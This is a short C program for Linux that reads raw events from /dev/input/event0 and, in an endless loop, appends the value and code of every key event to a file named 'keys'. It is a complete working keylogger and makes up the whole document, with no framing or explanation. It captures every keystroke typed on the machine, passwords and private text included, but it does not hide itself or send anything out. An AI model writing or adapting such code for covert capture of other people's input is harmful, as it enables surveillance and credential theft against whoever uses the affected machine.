#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>
#include <stdio.h>


int main(){
	const char *dev = "/dev/input/event0";
    struct input_event ev;
    int fd;

    fd = open(dev, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
        return EXIT_FAILURE;
    }
    FILE* out = fopen("keys", "w");
    fprintf(out, "");
	fclose(out);
	while(1){
		FILE* out = fopen("keys", "a");
		read(fd, &ev, sizeof ev);
		if(ev.type==EV_KEY){
			fprintf(out, "%d %d\n",ev.value,ev.code);
		}
		fclose(out);
	}
}